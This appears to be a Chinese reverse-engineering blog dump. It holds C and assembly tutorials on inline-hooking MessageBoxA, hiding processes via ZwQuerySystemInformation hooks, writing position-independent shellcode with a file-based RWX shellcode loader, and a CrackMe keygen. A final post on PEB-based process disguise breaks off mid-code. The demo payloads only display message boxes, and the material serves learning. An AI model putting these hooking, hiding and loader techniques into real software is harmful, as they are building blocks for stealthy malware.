想要用JMP进行修改，我们就需要构造机器码修改前五个字节。来尝试HOOK一下MessageBox函数。 具体实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;Windows.h&gt;int WINAPI My_MessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);FARPROC MessageBoxAAddress;BYTE NewData[5] = &#123; 0xE9, 0x0, 0x0, 0x0,0 &#125;;BYTE OldData[5] = &#123; 0 &#125;;void InlineHook();void UnInlineHook();int main() &#123; MessageBoxA(NULL, &quot;原始窗口1&quot;, &quot;未被HOOK&quot;, MB_OK); InlineHook(); MessageBoxA(NULL, &quot;原始窗口2&quot;, &quot;未被HOOK&quot;, MB_OK); UnInlineHook(); MessageBoxA(NULL, &quot;原始窗口3&quot;, &quot;未被HOOK&quot;, MB_OK); return 0;&#125;void InlineHook() &#123; MessageBoxAAddress = GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); //保存原数据 memcpy(OldData, MessageBoxAAddress, 5); //计算需要跳转的偏移 DWORD dwOffset = (DWORD)My_MessageBoxA - (DWORD)MessageBoxAAddress - 5; //写入新数据，跳转的偏移 memcpy(&amp;NewData[1], &amp;dwOffset, 5); DWORD dwOldprotect = 0; //修改页属性 VirtualProtect(MessageBoxAAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldprotect); //写入五个字节 memcpy(MessageBoxAAddress, NewData, 5); //恢复页属性 VirtualProtect(MessageBoxAAddress, 5, dwOldprotect, &amp;dwOldprotect);&#125;void UnInlineHook() &#123; MessageBoxAAddress = GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); DWORD dwOldProtect = 0; VirtualProtect(MessageBoxAAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); //恢复原来的字节码 memcpy(MessageBoxAAddress, OldData, 5); VirtualProtect(MessageBoxAAddress, 5, dwOldProtect, &amp;dwOldProtect);&#125;int WINAPI My_MessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType) &#123; //先恢复原来的字节码，然后调用正常的MessageboxA弹窗 UnInlineHook(); int bRet = MessageBoxA(NULL, &quot;Inline Hook\\ni am b1ackie!!!&quot;, &quot;hook&quot;, MB_OK); InlineHook(); return bRet;&#125; 可以看到有三个弹窗，正常流程下肯定是1,2,3但是我们Inline Hook了MessageBoxA函数，并且将其中内容改了，如果成功的话，第二个弹窗会不一样，运行程序查看效果。 先是第一个正常的窗口 然后是第二个窗口，开始了InlineHook，可以看到并没有弹出原始窗口2，说明此时已经被HOOK了 第三个窗口再取消InlineHook后弹出正常的窗口 现在使用OD载入程序来看一下，直接查看第二个MessageBoxA函数，进入查看可以看到函数头部已经改变了，变成了JMP。 跳过来看，就是我们自己编写的My_MessageBoxA函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464700401170 &gt;/. 55 push ebp00401171 |. 8BEC mov ebp,esp00401173 |. 83EC 08 sub esp,0x800401176 |. A1 04304100 mov eax,dword ptr ds:[__security_cookie_fai&gt;0040117B |. 33C5 xor eax,ebp0040117D |. 8945 FC mov dword ptr ss:[ebp-0x4],eax00401180 |. 56 push esi00401181 |. 68 4C1C4100 push InlineHo.00411C4C ; /MessageBoxA00401186 |. 68 581C4100 push InlineHo.00411C58 ; |/user32.dll0040118B |. FF15 04D04000 call dword ptr ds:[&lt;&amp;KERNEL32.LoadLibraryA&gt;&gt;; |\\LoadLibraryA00401191 |. 50 push eax ; |hModule = 0000000100401192 |. FF15 08D04000 call dword ptr ds:[&lt;&amp;KERNEL32.GetProcAddres&gt;; \\GetProcAddress00401198 |. 8B35 00D04000 mov esi,dword ptr ds:[&lt;&amp;KERNEL32.VirtualPro&gt;; kernel32.VirtualProtect0040119E |. 8D4D F8 lea ecx,dword ptr ss:[ebp-0x8]004011A1 |. 51 push ecx ; /pOldProtect = 049BE914004011A2 |. 6A 40 push 0x40 ; |NewProtect = PAGE_EXECUTE_READWRITE004011A4 |. 6A 05 push 0x5 ; |Size = 0x5004011A6 |. 50 push eax ; |Address = 00000001004011A7 |. A3 A0424100 mov dword ptr ds:[MessageBoxAAddressfailure&gt;; |004011AC |. C745 F8 00000&gt;mov dword ptr ss:[ebp-0x8],0x0 ; |004011B3 |. FFD6 call esi ; \\VirtualProtect004011B5 |. 8B0D A0424100 mov ecx,dword ptr ds:[MessageBoxAAddressfai&gt;; user32.MessageBoxA004011BB |. A1 98424100 mov eax,dword ptr ds:[OldDatan_table]004011C0 |. 8901 mov dword ptr ds:[ecx],eax004011C2 |. A0 9C424100 mov al,byte ptr ds:[0x41429C]004011C7 |. 8841 04 mov byte ptr ds:[ecx+0x4],al004011CA |. 8D45 F8 lea eax,dword ptr ss:[ebp-0x8]004011CD |. 50 push eax ; /pOldProtect = 00000001004011CE |. FF75 F8 push dword ptr ss:[ebp-0x8] ; |NewProtect = PAGE_NOACCESS|PAGE_WRITECOPY|PAGE_EXECUTE|PAGE_EXECUTE_READWRITE|MEM_COMMIT|400400004011D1 |. 6A 05 push 0x5 ; |Size = 0x5004011D3 |. 51 push ecx ; |Address = 049BE914004011D4 |. FFD6 call esi ; \\VirtualProtect004011D6 |. 6A 00 push 0x0 ; /Style = MB_OK|MB_APPLMODAL004011D8 |. 68 641C4100 push InlineHo.00411C64 ; |hook004011DD |. 68 6C1C4100 push InlineHo.00411C6C ; |Inline Hook\\ni am b1ackie!!!004011E2 |. 6A 00 push 0x0 ; |hOwner = NULL004011E4 |. FF15 10D14000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;] ; \\MessageBoxA004011EA |. 8BF0 mov esi,eax004011EC |. E8 CFFEFFFF call InlineHo.InlineHook_ansi_nolocketaryso&gt;004011F1 |. 8B4D FC mov ecx,dword ptr ss:[ebp-0x4]004011F4 |. 8BC6 mov eax,esi004011F6 |. 33CD xor ecx,ebp004011F8 |. 5E pop esi ; InlineHo.0040103C004011F9 |. E8 06000000 call InlineHo.__security_check_cookiepresen&gt;004011FE |. 8BE5 mov esp,ebp00401200 |. 5D pop ebp ; InlineHo.0040103C00401201 \\. C2 1000 retn 0x10 注入方式实现inline hook我们可以将inline hook写成一个dll文件，然后通过远线程注入的方式，将其注入到进程中。 远程线程的具体实现：注入技术-远程线程注入 编写一个弹窗，实现效果如下 当注入成功后，内容更改 总结本篇只介绍了32位的Inline Hook，但是64位原理相同，只是修改的字节数不同，还有跳转方式也只介绍了基于JMP的，还有其他几种跳转方式，感兴趣可以看《加密与解密第四版》其中有较为详细的介绍。","categories":[{"name":"HOOK技术","slug":"HOOK技术","permalink":"https://b1ack1e.github.io/categories/HOOK%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"Inline Hook","slug":"Inline-Hook","permalink":"https://b1ack1e.github.io/tags/Inline-Hook/"}]},{"title":"隐藏技术-进程隐藏","slug":"隐藏技术-进程隐藏","date":"2021-07-27T03:25:51.000Z","updated":"2021-08-09T10:52:38.617Z","comments":true,"path":"2021/07/27/隐藏技术-进程隐藏/","link":"","permalink":"https://b1ack1e.github.io/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/","excerpt":"","text":"进程隐藏在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操作的空间。它可以通过HOOK技术拦截API的调用，并对数据进行监控和修改，从而达到不可告人的目的。 实现进程隐藏可以HOOK ZwQuerySystemInformain来实现进程的隐藏。遍历进程通常是调用EnumProcesses或者CreateToolhelp32Snapshot等来实现。跟踪这些函数可以发现，他们内部都调用了ZwQuerySystemInformain函数。 可以用调试器跟踪一下CreateToolhelp32Snapshot函数，可以看到在内部调用了ZwQuerySystemInformain函数 在ZwQuerySystemInformain函数的内部判断检索的信息是否是进程信息，若是，则对返回的进程信息进行修改，将隐藏的进程信息从中去掉再返回。 这需要用到Inline Hook，关于Inline Hook看这里 HOOK-Inline Hook 函数介绍ZwQuerySystemInformation 获取指定的系统信息 123456NTSTATUS WINAPI ZwQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength); SystemInformationClass：要检索系统的信息类型。SystemProcessInformation(5)表示检索系统的进程信息。 SystemInformation：指向缓冲区的指针，用于接受请求的信息。该信息的大小和结构取决于SystemInformationClass的值。如检索信息是SystemProcessInformation那么缓冲区为SYSTEM_PROCESS_INFORMATION结构数组。 SystemInformationLength：SystemInformation指向缓冲区的大小。 ReturnLength：指向函数写入请求信息的实际大小的位置。 返回值：返回NTSTATUS成功或错误代码。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"shellcode学习","slug":"shellcode学习","date":"2021-07-22T01:58:08.000Z","updated":"2021-08-09T10:53:47.394Z","comments":true,"path":"2021/07/22/shellcode学习/","link":"","permalink":"https://b1ack1e.github.io/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"shellcode学习编译器的一些设置第一步修改入口点在编译器中修改程序的入口点，写代码时就可以使用新的入口点名 修改过后，体积变得很小，使用IDA查看也可以看到左边函数只有两个。 第二步关闭缓冲区安全检查 然后查看IDA，左边函数只剩一个了 第三步设置工程兼容XP 修改运行库为MT 第四步关闭生成清单 使用loadpe查看看到只有两个区段 第五步关闭调试信息 shellcode编写原则1 杜绝双引号字符串的直接使用 关闭VS自动优化没有使用到的变量 自定义函数入口 #pragma comment(linker,”/entry:EntryMain”) shellcode编写原则2动态获取函数地址 12345678910111213141516#include &lt;Windows.h&gt;#pragma comment(linker,&quot;/entry:EntryMain&quot;)int EntryMain() &#123; typedef int (WINAPI* FN_MessageBoxA)( __in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType); FN_MessageBoxA fn_MessageBoxA; fn_MessageBoxA = (FN_MessageBoxA)GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); fn_MessageBoxA(NULL, &quot;b1ackie&quot;, &quot;hhh&quot;, NULL); return 0;&#125; shellcode编写原则3获取kernel32.dll基址和GetProcAddress地址获取。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#pragma comment(linker,&quot;/entry:EntryMain&quot;)#pragma comment(lib, &quot;ucrtd.lib&quot;) //#pragma comment(lib, &quot;msvcrtd.lib&quot;) //#pragma comment(lib, &quot;vcruntimed.lib&quot;) _declspec(naked) DWORD getKernel32() &#123; __asm &#123; mov eax, fs: [30h] //获取PEB mov eax, [eax + 0Ch] //获取_PEB_LDR_DATA mov eax, [eax + 14h] //InMemoryOrderModuleList， mov eax, [eax] //程序自身 mov eax, [eax] //ntdll.dll mov eax,[eax+10h] //kernel.dll,偏移10H是地址 ret &#125;&#125;FARPROC _GetProcAddress(HMODULE hModule) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames); PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals); PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions); DWORD dwNumber = lpExport-&gt;NumberOfNames; DWORD wHint = 0; FARPROC lpFunc; for (DWORD i = 0; i &lt; dwNumber; i++) &#123; char *lpFuncName = (char*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (lpFuncName[0] == &#x27;G&#x27;&amp;&amp; lpFuncName[1] == &#x27;e&#x27;&amp;&amp; lpFuncName[2] == &#x27;t&#x27;&amp;&amp; lpFuncName[3] == &#x27;P&#x27;&amp;&amp; lpFuncName[4] == &#x27;r&#x27;&amp;&amp; lpFuncName[5] == &#x27;o&#x27;&amp;&amp; lpFuncName[6] == &#x27;c&#x27;&amp;&amp; lpFuncName[7] == &#x27;A&#x27;&amp;&amp; lpFuncName[8] == &#x27;d&#x27;&amp;&amp; lpFuncName[9] == &#x27;d&#x27;&amp;&amp; lpFuncName[10] == &#x27;r&#x27;&amp;&amp; lpFuncName[11] == &#x27;e&#x27;&amp;&amp; lpFuncName[12] == &#x27;s&#x27;&amp;&amp; lpFuncName[13] == &#x27;s&#x27;) &#123; wHint = lpAddressOfNameOrdinalArray[i]; lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; return lpFunc; //PWORD &#125;int EntryMain() &#123; HMODULE hAddr = (HMODULE)getKernel32(); typedef FARPROC(WINAPI* FN_GetProcAddress)( _In_ HMODULE hModule, _In_ LPCSTR lpProcName ); FN_GetProcAddress fn_GetProcAddress; fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr); return 0;&#125; shellcode编写原则4 避免全局变量的使用 确保已加载所使用的API的动态链接库 第一种shellcode生成框架通过上述操作直接编写，编写一个拥有弹窗功能的shellcode 具体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;Windows.h&gt;DWORD getKernel32();FARPROC _GetProcAddress(HMODULE hModule);int EntryMain() &#123; HMODULE hAddr = (HMODULE)getKernel32(); typedef FARPROC(WINAPI* FN_GetProcAddress)( _In_ HMODULE hModule, _In_ LPCSTR lpProcName ); FN_GetProcAddress fn_GetProcAddress; fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr); typedef HMODULE(WINAPI* FN_LoadLibraryA)( _In_ LPCSTR lpLibFileName); char szLoadLibraryA[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;A&#x27;,0 &#125;; FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA); char szMessageBoxA[] = &#123; &#x27;M&#x27;, &#x27;e&#x27;, &#x27;s&#x27;, &#x27;s&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;B&#x27;, &#x27;o&#x27;, &#x27;x&#x27;, &#x27;A&#x27;, 0 &#125;; typedef int(WINAPI* FN_MessageBoxA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType); char szUser32[] = &#123; &#x27;U&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,0 &#125;; FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress(fn_LoadLibraryA(szUser32), szMessageBoxA); char szHello[] = &#123; &#x27;b&#x27;,&#x27;1&#x27;,&#x27;a&#x27;,&#x27;c&#x27;,&#x27;k&#x27;,&#x27;i&#x27;,&#x27;e&#x27;,&#x27;!&#x27;,0 &#125;; char szTitle[] = &#123; &#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,0 &#125;; fn_MessageBoxA(NULL, szHello, szTitle, NULL); return 0;&#125;_declspec(naked) DWORD getKernel32() &#123; __asm &#123; mov eax, fs: [30h] //获取PEB mov eax, [eax + 0Ch] //获取_PEB_LDR_DATA mov eax, [eax + 14h] //InMemoryOrderModuleList， mov eax, [eax] //程序自身 mov eax, [eax] //ntdll.dll mov eax, [eax + 10h] //kernel.dll,偏移10H是地址 ret &#125;&#125;FARPROC _GetProcAddress(HMODULE hModule) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames); PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals); PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions); DWORD dwNumber = lpExport-&gt;NumberOfNames; DWORD wHint = 0; FARPROC lpFunc; for (DWORD i = 0; i &lt; dwNumber; i++) &#123; char* lpFuncName = (char*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (lpFuncName[0] == &#x27;G&#x27; &amp;&amp; lpFuncName[1] == &#x27;e&#x27; &amp;&amp; lpFuncName[2] == &#x27;t&#x27; &amp;&amp; lpFuncName[3] == &#x27;P&#x27; &amp;&amp; lpFuncName[4] == &#x27;r&#x27; &amp;&amp; lpFuncName[5] == &#x27;o&#x27; &amp;&amp; lpFuncName[6] == &#x27;c&#x27; &amp;&amp; lpFuncName[7] == &#x27;A&#x27; &amp;&amp; lpFuncName[8] == &#x27;d&#x27; &amp;&amp; lpFuncName[9] == &#x27;d&#x27; &amp;&amp; lpFuncName[10] == &#x27;r&#x27; &amp;&amp; lpFuncName[11] == &#x27;e&#x27; &amp;&amp; lpFuncName[12] == &#x27;s&#x27; &amp;&amp; lpFuncName[13] == &#x27;s&#x27;) &#123; wHint = lpAddressOfNameOrdinalArray[i]; lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; return lpFunc;&#125; 然后使用PEID查看偏移，可以看到是200, 然后使用十六进制编辑器将其中的机器码拷贝出来。 选取一个替代的程序，查看其偏移 然后进入编辑器，从偏移开始粘贴我们的机器码 然后打开这个程序就会实现shellcode编写的弹窗效果了 第二种shellcode生成框架单文件的函数生成位置规律单文件的函数生成规律，与函数实现的先后顺序有关，与定义的顺序无关。 如这样一个程序，定义的顺序是先A，后B 在IDA中可以看到顺序是先B后A。 多文件生成规律与包含的文件位置无关，与实际调用顺序有关。 在文件中的.vcxproj文件，如图此时是这个顺序，可以看到编译顺序一致。 修改一下顺序，编译顺序也会改变 实际编写在其中定义几个文件 0.entry.cpp：入口点 a.start.cpp：shellcode执行 z.end.cpp：shellcode结束 a-z之间可以放shellcode的所有功能的具体实现。在0.entry中写创建文件，根据文件的生成规律，可以知道文件的大小就是a.start.cpp中的ShellcodeEnd - z.end.cpp中的ShellcodeStart。 12345HANDLE hBin = CreateFileA(&quot;sh.bin&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);DWORD dwSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;DWORD dwWrite;WriteFile(hBin, ShellcodeStart, dwSize, &amp;dwWrite, NULL);CloseHandle(hBin); shellcode加载器123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc,char* argv[])&#123; HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;open failed\\n&quot;); return -1; &#125; DWORD dwSize; dwSize = GetFileSize(hFile, NULL); LPVOID lpAddr = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (lpAddr == NULL) &#123; printf(&quot;virtual failed\\n&quot;); CloseHandle(hFile); return -1; &#125; DWORD dwRead; ReadFile(hFile, lpAddr, dwSize, &amp;dwRead, 0); __asm &#123; call lpAddr &#125; _flushall(); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/categories/ShellCode/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/tags/ShellCode/"}]},{"title":"160CrackMe-003","slug":"160CrackMe-003","date":"2021-07-21T07:11:38.000Z","updated":"2021-08-09T10:53:52.616Z","comments":true,"path":"2021/07/21/160CrackMe-003/","link":"","permalink":"https://b1ack1e.github.io/2021/07/21/160CrackMe-003/","excerpt":"","text":"初探打开程序看到需要输入用户名和序列号尝试输入后提示错误 分析使用工具查看，发现未加壳，语言是VB。 用OD打开程序，直接搜素错误字符串即可定位。首先还是和002一样，先是获取长度然后进行一些操作再加上NAME[0] 1234567891011121314151617004081E3 . FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; Msvbvm50.__vbaHresultCheckObj004081E9 &gt; 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]004081EF . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; 获取输入的name004081F2 . 50 push eax ; /String = 00004000 ???004081F3 . 8B1A mov ebx,dword ptr ds:[edx] ; |004081F5 . FF15 F8B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \\获取name长度004081FB . 8BF8 mov edi,eax004081FD . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18]00408200 . 69FF 385B0100 imul edi,edi,0x15B38 ; 长度乘以0x15B3800408206 . 51 push ecx ; /String = 091C840A ???00408207 . 0F80 B7050000 jo AfKayAs_.004087C4 ; |0040820D . FF15 0CB14000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\获取输入name的第一次ascii码00408213 . 0FBFD0 movsx edx,ax00408216 . 03FA add edi,edx ; 长度计算后加上name[0]00408218 . 0F80 A6050000 jo AfKayAs_.004087C40040821E . 57 push edi ; Msvbvm50.__vbaObjSet0040821F . FF15 F4B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; 转字符串（十进制） 然后将结果转为浮点数执行了几次操作。 第一次 123456789101112131415161718004082E9 . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; 转为浮点数004082EF . D905 08104000 fld dword ptr ds:[0x401008] ; １０004082F5 . 833D 00904000&gt;cmp dword ptr ds:[0x409000],0x0004082FC . 75 08 jnz short AfKayAs_.00408306004082FE . D835 0C104000 fdiv dword ptr ds:[0x40100C] ; １０／５00408304 . EB 0B jmp short AfKayAs_.0040831100408306 &gt; FF35 0C104000 push dword ptr ds:[0x40100C]0040830C . E8 578DFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;00408311 &gt; 83EC 08 sub esp,0x800408314 . DFE0 fstsw ax00408316 . A8 0D test al,0xD00408318 . 0F85 A1040000 jnz AfKayAs_.004087BF0040831E . DEC1 faddp st(1),st ; ＋２00408320 . DFE0 fstsw ax00408322 . A8 0D test al,0xD00408324 . 0F85 95040000 jnz AfKayAs_.004087BF0040832A . DD1C24 fstp qword ptr ss:[esp]0040832D . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; 转回去 第二次 123456789004083F5 . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; Msvbvm50.__vbaR8Str004083FB . DC0D 10104000 fmul qword ptr ds:[0x401010] ; ＊３00408401 . 83EC 08 sub esp,0x800408404 . DC25 18104000 fsub qword ptr ds:[0x401018] ; －２0040840A . DFE0 fstsw ax0040840C . A8 0D test al,0xD0040840E . 0F85 AB030000 jnz AfKayAs_.004087BF00408414 . DD1C24 fstp qword ptr ss:[esp]00408417 . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; Msvbvm50.__vbaStrR8 第三次 12345678004084DF . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; Msvbvm50.__vbaR8Str004084E5 . DC25 20104000 fsub qword ptr ds:[0x401020] ; ＋１５004084EB . 83EC 08 sub esp,0x8004084EE . DFE0 fstsw ax004084F0 . A8 0D test al,0xD004084F2 . 0F85 C7020000 jnz AfKayAs_.004087BF004084F8 . DD1C24 fstp qword ptr ss:[esp]004084FB . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; Msvbvm50.__vbaStrR8 最后的比较也是使用浮点数进行比较，用计算出结果除以我们输入，再与1进行比较。 12345678910111213141516004085F1 . DCBD 1CFFFFFF fdivr qword ptr ss:[ebp-0xE4] ; 计算的ｓｅｒｉａｌ／输入004085F7 . EB 11 jmp short AfKayAs_.0040860A004085F9 &gt; FFB5 20FFFFFF push dword ptr ss:[ebp-0xE0]004085FF . FFB5 1CFFFFFF push dword ptr ss:[ebp-0xE4]00408605 . E8 888AFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;0040860A &gt; DFE0 fstsw ax0040860C . A8 0D test al,0xD0040860E . 0F85 AB010000 jnz AfKayAs_.004087BF00408614 . FF15 34B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;; Msvbvm50.__vbaFpR80040861A . DC1D 28104000 fcomp qword ptr ds:[0x401028] ; 结果与１进行比较00408620 . DFE0 fstsw ax ; 将寄存器的值传给ＡＸ00408622 . F6C4 40 test ah,0x40 ; 比较ａｈ值与０ｘ４０00408625 . 74 07 je short AfKayAs_.0040862E ; 若不相等就会跳到清空ｅｓｉ处00408627 . BE 01000000 mov esi,0x1 ; 相等ｅｓｉ赋值１0040862C . EB 02 jmp short AfKayAs_.004086300040862E &gt; 33F6 xor esi,esi ; 清空寄存器 这里 fcomp是比较后改变寄存器状态，然后再由fstsw指令将寄存器值传给ax 比较结果 C3 C0 ST(0)&gt;源操作数 0 0 ST(0)&lt;源操作数 0 1 ST(0)=源操作数 1 0 ST(0)不可比较 1 1 看一下FST寄存器，看到寄存器中的值，此时是输入等于计算的时候，看到FST是4000，C3是1 计算器转换一下看的仔细 注册机12345678910111213141516#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name, 20); int len = strlen(name); int serial; serial = len * 0x15B38; serial += name[0]; serial = (serial + 2) * 3 - 2 + 15; printf(&quot;serial:%d\\n&quot;, serial); return 0;&#125; 输入正确的serial","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"隐藏技术-进程伪装","slug":"隐藏技术-进程伪装","date":"2021-07-21T06:02:59.000Z","updated":"2021-08-09T10:52:36.592Z","comments":true,"path":"2021/07/21/隐藏技术-进程伪装/","link":"","permalink":"https://b1ack1e.github.io/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/","excerpt":"","text":"进程伪装进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。 实现原理实现起来原理并不复杂，就是修改指定进程的进程环境块PEB中的进程路径以及命令行信息即可。下面使用Windbg来查看一下notepad的相关信息。 查看PEB的相关信息，可以看到ProcessParameters，这里有进程的路径和命令行相关信息。 继续查看这个结构，可以看到ImagePathName和CommandLine，也可以看到其中的信息都是”C:\\Windows\\system32\\notepad.exe” 编码实现 获取PEB地址 获取ProcessParameters 写入伪装信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// DisguiseProcess.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;winternl.h&gt;#include &lt;process.h&gt;typedef 